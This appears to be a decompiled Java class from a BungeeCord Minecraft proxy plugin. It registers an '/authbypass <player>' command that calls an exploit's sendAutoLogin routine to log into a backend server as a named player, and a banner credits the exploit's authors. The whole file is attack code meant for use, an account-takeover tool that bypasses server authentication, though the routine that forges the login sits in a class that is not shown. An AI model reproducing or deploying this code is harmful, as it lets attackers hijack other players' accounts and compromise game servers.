import exploit.Main;
import java.io.IOException;
import net.md_5.bungee.api.CommandSender;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.plugin.Command;

public class d extends Command {
   public d() {
      super("authbypass", "", new String[]{"authbypass"});
   }

   public void execute(CommandSender arg0, String[] arg1) {
      arg0.sendMessage(new TextComponent("§f"));
      arg0.sendMessage(new TextComponent("§7 *  *  *  §cInfo Exploit  §7*  *  * "));
      arg0.sendMessage(new TextComponent("§c"));
      arg0.sendMessage(new TextComponent("§aThis exploit is made by §eVessy1337§a."));
      arg0.sendMessage(new TextComponent("§aSRC by §eHektorr_ §aand compiled by §eVessy133748§a."));
      arg0.sendMessage(new TextComponent("§a"));
      if (arg0 instanceof ProxiedPlayer) {
         if (arg1.length != 1) {
            arg0.sendMessage(new TextComponent("§cUse: §e/authbypass <player>"));
            arg0.sendMessage(new TextComponent("§a"));
            return;
         }

         try {
            arg0.sendMessage(new TextComponent("Tentando..."));
            Main.instance.sendAutoLogin(((ProxiedPlayer)arg0).getServer(), arg1[0]);
         } catch (IOException var4) {
            arg0.sendMessage(new TextComponent("§cOperazione fallita: §eRichiesta rifiutata."));
         }
      }

   }
}
